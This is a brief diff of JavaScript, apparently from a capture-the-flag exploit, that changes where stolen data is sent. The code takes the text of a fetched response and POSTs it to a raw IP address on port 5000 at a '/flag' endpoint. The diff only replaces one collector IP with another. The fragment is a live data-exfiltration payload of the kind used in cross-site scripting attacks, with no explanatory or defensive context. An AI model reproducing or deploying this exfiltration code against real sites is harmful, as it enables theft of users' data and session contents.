@@ -6,7 +6,7 @@ body: fdata
 }).then((res) => {
 return res.text();
 }).then((data) => {
-fetch("http://47.113.144.169:5000/flag", {
+fetch("http://120.26.219.126:5000/flag", {
 method: "POST",
 body: data
 });
